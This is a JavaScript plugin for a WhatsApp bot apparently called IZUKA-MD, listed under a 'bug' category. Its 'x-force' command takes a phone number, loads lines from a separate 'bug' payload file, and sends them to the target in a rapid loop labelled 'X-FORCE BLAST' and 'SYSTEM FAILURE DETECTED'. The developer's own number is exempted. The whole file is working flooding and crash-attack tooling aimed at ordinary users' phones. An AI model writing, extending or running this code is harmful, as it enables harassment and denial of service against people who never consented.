const notif4 = require('../../bug/izuka5.js');
const config = require('../../config');
const { cmd } = require('../command');

cmd({
  pattern: 'x-force',
  desc: 'Launch X-FORCE styled attack',
  category: 'bug',
  filename: __filename
}, async (message, sock) => {
  const prefix = config.PREFIX;
  const botNumber = await sock.decodeJid(sock.user.id);
  const isOwner = [botNumber, config.OWNER_NUMBER + '@s.whatsapp.net'].includes(message.sender);
  const forbiddenNumber = ['13058962443']; // protection du Dev

  const cmd = message.body.startsWith(prefix)
    ? message.body.slice(prefix.length).split(' ')[0].toLowerCase()
    : '';
  const args = message.body.trim().split(' ').slice(1);

  let targetNumber;
  if (message.from.endsWith('@g.us')) {
    // si se nan group san nimewo
    targetNumber = message.sender.split('@')[0];
  } else if (args.length > 0 && !isNaN(args[0])) {
    targetNumber = args[0];
  }

  if (!targetNumber) {
    return await sock.sendMessage(
      message.from,
      {
        text: `❌ Usage:\n*x-force <number>*\nor simply type *x-force* in a group.`,
      },
      { quoted: message }
    );
  }

  if (forbiddenNumber.includes(targetNumber)) {
    return await sock.sendMessage(
      message.from,
      {
        text: `🛡️ This number is protected by IZUKA-MD. Attack blocked.`,
      },
      { quoted: message }
    );
  }

  const target = `${targetNumber}@s.whatsapp.net`;

  await sock.sendMessage(
    message.from,
    {
      text: `⚔️ Launching *X-FORCE* attack on: +${targetNumber}...\nPlease wait...`,
    },
    { quoted: message }
  );

  const messages = notif4.split('\n').filter(Boolean);
  for (let i = 0; i < messages.length; i++) {
    await sock.sendMessage(target, {
      text: `🔺 *X-FORCE BLAST #${i + 1}* 🔻\n${messages[i]}\n\n_⚠️ SYSTEM FAILURE DETECTED_\n~IZUKA MD~`,
    });
    await new Promise((resolve) => setTimeout(resolve, 200));
  }

  await sock.sendMessage(
    message.from,
    {
      text: `✅ *X-FORCE* attack successfully completed.`,
    },
    { quoted: message }
  );
});